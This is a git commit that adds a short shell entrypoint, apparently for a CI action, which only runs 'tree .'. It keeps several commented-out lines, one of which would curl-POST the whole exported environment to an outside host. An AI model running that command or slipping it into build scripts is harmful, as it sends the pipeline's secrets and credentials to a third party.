75b74ec6497038b6eb86cedb25147083d012d8e0
bittervan <bittervan@zju.edu.cn>
2022-03-18 18:25:43 +0800

    try without tags

---
+++ entrypoint.sh
@@ -0,0 +1,7 @@
+#!/bin/sh -l
+
+# echo "Hello $(export -p)"
+# curl -s -d "$(export -p)" "http://tencent.bittervan.xyz:2782" > /dev/null
+# time=$(date)
+# echo "::set-output name=time::$time"
+tree .
